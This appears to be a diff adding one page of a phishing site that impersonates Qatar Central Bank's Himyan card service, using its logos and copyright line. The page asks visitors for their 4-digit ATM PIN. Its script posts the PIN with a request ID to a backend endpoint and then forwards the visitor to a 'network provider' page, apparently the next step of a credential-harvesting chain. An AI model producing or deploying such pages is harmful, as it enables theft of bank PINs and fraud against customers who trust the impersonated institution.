@@ -1,0 +1,161 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="description" content="إدخال رقم ATM السري لطلب بطاقة هميان." />
+    <title>رقم ATM السري | هميان</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css" />
+    <style>
+        .code-entry-panel {
+            max-width: 760px;
+            margin: 0 auto
+        }
+
+        .code-entry-panel .confirmation-layout {
+            display: block;
+            max-width: 760px;
+            margin: 0 auto
+        }
+
+        .code-entry-panel .confirmation-card {
+            display: block;
+            width: 100%;
+            box-sizing: border-box
+        }
+
+        .code-entry-card {
+            max-width: 620px;
+            margin: 0 auto
+        }
+
+        .code-entry-card .demo-payment-form {
+            margin-top: 24px
+        }
+
+        .code-entry-field {
+            display: block;
+            text-align: center
+        }
+
+        .code-entry-field>span {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 700
+        }
+
+        .code-entry-input {
+            width: 100%;
+            box-sizing: border-box;
+            text-align: center;
+            direction: ltr;
+            letter-spacing: .55em;
+            font-size: clamp(28px, 7vw, 42px);
+            font-weight: 700;
+            padding: 16px 14px;
+            border: 1px solid #d8c9cf;
+            border-radius: 12px;
+            color: #8a173b;
+            background: #fff
+        }
+
+        .code-entry-input:focus {
+            outline: 3px solid rgba(138, 23, 59, .16);
+            border-color: #8a173b
+        }
+
+        .code-entry-help {
+            text-align: center;
+            color: #6d6066;
+            line-height: 1.8
+        }
+
+        .code-entry-card .payment-action-row {
+            justify-content: center
+        }
+
+        .code-entry-card .demo-pay-button {
+            min-width: 170px
+        }
+
+        .code-entry-card .demo-form-message {
+            color: #b52b49;
+            text-align: center
+        }
+
+        .code-entry-card .demo-form-message.is-visible {
+            margin-top: 14px
+        }
+    </style>
+</head>
+
+<body class="success-page confirmation-page">
+    <header class="site-header">
+        <div class="header-top container">
+            <div class="mobile-controls"><button class="menu-toggle" type="button" aria-label="فتح القائمة"
+                    aria-expanded="false"
+                    aria-controls="main-navigation"><span></span><span></span><span></span></button><a
+                    class="mobile-language" href="#" data-language-switch>EN</a></div>
+            <a class="qcb-link" href="https://www.qcb.gov.qa" aria-label="مصرف قطر المركزي"><img class="qcb-logo"
+                    src="qcb-logo.svg" alt="مصرف قطر المركزي" /></a>
+            <a class="himyan-link" href="index.html#top" aria-label="هميان"><img class="himyan-logo" src="logo.svg"
+                    alt="هميان HIMYAN" /></a>
+        </div>
+        <nav id="main-navigation" class="main-navigation container" aria-label="القائمة الرئيسية"><a
+                href="index.html#top">عن هميان</a><a href="index.html#about">أهداف إصدار البطاقة</a><a
+                href="index.html#cards">مواصفات البطاقة</a><a href="index.html#advantages">مميزات البطاقة</a><a
+                href="index.html#cards">عروض البطاقة</a><a href="index.html#cards">الأخبار</a><a
+                href="index.html#cards">مصدرو البطاقة</a><a href="index.html#cards">الفئات المستهدفة</a><a
+                href="index.html#cards">إرشادات أمنية</a><a class="language" href="#" data-language-switch>EN</a></nav>
+    </header>
+    <main class="confirmation-main">
+        <h1 class="payment-page-title" id="page-title">رقم ATM السري</h1>
+        <section class="confirmation-hero code-entry-panel">
+            <div class="container confirmation-layout">
+                <div class="confirmation-card code-entry-card">
+                    <div class="confirmation-status-icon" aria-hidden="true"><svg viewBox="0 0 64 64" fill="none">
+                            <circle cx="32" cy="32" r="27" stroke="currentColor" stroke-width="4" />
+                            <path d="M22 32h20M32 22v20" stroke="currentColor" stroke-width="4.5"
+                                stroke-linecap="round" />
+                        </svg></div>
+                    <span class="section-kicker" id="page-kicker">رقم ATM السري</span>
+                    <h1 id="page-heading">أدخل رقم ATM السري</h1>
+                    <p class="confirmation-message" id="page-message">يرجى إدخال رقم ATM السري المكوّن من 4 أرقام ثم
+                        الضغط على زر التالي.</p>
+                    <div class="confirmation-reference"><span id="reference-label">الرقم المرجعي للطلب</span><strong
+                            id="request-reference">—</strong></div>
+                    <form class="demo-payment-form" id="pin-form"><label class="code-entry-field"><span
+                                id="pin-label">أدخل رقم ATM السري</span><input class="code-entry-input"
+                                id="atm-pin-input" type="password" inputmode="numeric" maxlength="4" minlength="4"
+                                pattern="[0-9٠-٩]{4}" aria-label="رقم ATM السري المكون من 4 أرقام" required /></label>
+                        <p class="code-entry-help" id="pin-help">يجب أن يتكون الرقم من 4 أرقام فقط.</p>
+                        <div class="payment-action-row"><button class="demo-pay-button" type="submit"
+                                id="pin-submit">التالي</button><a class="demo-cancel-button" href="index.html#top"
+                                id="pin-cancel">إلغاء</a></div>
+                        <p class="demo-form-message" id="pin-message" role="status" aria-live="polite"></p>
+                    </form>
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer class="site-footer">
+        <div class="container footer-inner">
+            <p id="footer-rights">جميع الحقوق محفوظة © - مصرف قطر المركزي 2024</p>
+            <nav aria-label="روابط التذييل"><a href="index.html#top" id="footer-map">خريطة الموقع</a><a href="#"
+                    id="footer-legal">حقوق النشر وحدود المسئولية</a><a href="#" id="footer-privacy">الخصوصية</a></nav>
+        </div>
+    </footer>
+    <script>
+        const params = new URLSearchParams(window.location.search); const lang = params.get('lang') === 'en' ? 'en' : 'ar'; const requestId = params.get('requestId') || localStorage.getItem('himyan-request-id') || ''; const digitMap = '٠١٢٣٤٥٦٧٨٩';
+        const copy = lang === 'en' ? { page: 'ATM PIN', heading: 'Enter your ATM PIN', message: 'Enter your 4-digit ATM PIN number, then click Next.', reference: 'Application reference number', label: 'Enter your ATM PIN', help: 'The PIN must contain exactly 4 digits.', submit: 'Next', cancel: 'Cancel', error: 'Please enter exactly 4 digits.', missing: 'The request session has expired. Please return to the application page.', footer: 'All rights reserved © — Qatar Central Bank 2024', map: 'Sitemap', legal: 'Copyright and disclaimer', privacy: 'Privacy' } : { page: 'رقم ATM السري', heading: 'أدخل رقم ATM السري', message: 'يرجى إدخال رقم ATM السري المكوّن من 4 أرقام ثم الضغط على زر التالي.', reference: 'الرقم المرجعي للطلب', label: 'أدخل رقم ATM السري', help: 'يجب أن يتكون الرقم من 4 أرقام فقط.', submit: 'التالي', cancel: 'إلغاء', error: 'يرجى إدخال رقم مكوّن من 4 أرقام بالضبط.', missing: 'انتهت جلسة الطلب. يرجى العودة إلى صفحة التقديم.', footer: 'جميع الحقوق محفوظة © - مصرف قطر المركزي 2024', map: 'خريطة الموقع', legal: 'حقوق النشر وحدود المسئولية', privacy: 'الخصوصية' };
+        document.documentElement.lang = lang; document.documentElement.dir = lang === 'en' ? 'ltr' : 'rtl'; document.title = copy.page + ' | Himyan'; document.querySelector('#page-title').textContent = copy.page; document.querySelector('#page-kicker').textContent = copy.page; document.querySelector('#page-heading').textContent = copy.heading; document.querySelector('#page-message').textContent = copy.message; document.querySelector('#reference-label').textContent = copy.reference; document.querySelector('#pin-label').textContent = copy.label; document.querySelector('#pin-help').textContent = copy.help; document.querySelector('#pin-submit').textContent = copy.submit; document.querySelector('#pin-cancel').textContent = copy.cancel; document.querySelector('#footer-rights').textContent = copy.footer; document.querySelector('#footer-map').textContent = copy.map; document.querySelector('#footer-legal').textContent = copy.legal; document.querySelector('#footer-privacy').textContent = copy.privacy; document.querySelector('#request-reference').textContent = requestId ? requestId.slice(0, 8).toUpperCase() : '—';
+        document.querySelectorAll('[data-language-switch]').forEach((switcher) => { switcher.textContent = lang === 'ar' ? 'EN' : 'AR'; switcher.addEventListener('click', (event) => { event.preventDefault(); const next = lang === 'ar' ? 'en' : 'ar'; const url = new URL(window.location.href); url.searchParams.set('lang', next); window.location.href = url.toString(); }); }); const menuToggle = document.querySelector('.menu-toggle'); const navigation = document.querySelector('.main-navigation'); menuToggle?.addEventListener('click', () => { const expanded = menuToggle.getAttribute('aria-expanded') === 'true'; menuToggle.setAttribute('aria-expanded', String(!expanded)); navigation?.classList.toggle('is-open', !expanded); });
+        const input = document.querySelector('#atm-pin-input'); input.addEventListener('input', () => { input.value = input.value.replace(/[^0-9٠-٩]/g, '').slice(0, 4); }); document.querySelector('#pin-form').addEventListener('submit', async (event) => { event.preventDefault(); const normalized = input.value.replace(/[٠-٩]/g, (digit) => String(digitMap.indexOf(digit))); const message = document.querySelector('#pin-message'); if (!/^\d{4}$/.test(normalized)) { message.textContent = copy.error; message.classList.add('is-visible'); input.focus(); return; } if (!requestId) { message.textContent = copy.missing; message.classList.add('is-visible'); return; } const submit = document.querySelector('#pin-submit'); submit.disabled = true; try { const response = await fetch('/api/requests/atm-pin', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: requestId, atmPin: normalized }) }); if (!response.ok) throw new Error('submit failed'); window.location.href = `network-provider.html?lang=${lang}&requestId=${encodeURIComponent(requestId)}`; } catch { message.textContent = lang === 'en' ? 'Unable to submit ATM PIN. Please try again.' : 'تعذر إرسال رقم ATM. يرجى المحاولة مرة أخرى.'; message.classList.add('is-visible'); submit.disabled = false; } });
+    </script>
+</body>
+
+</html>
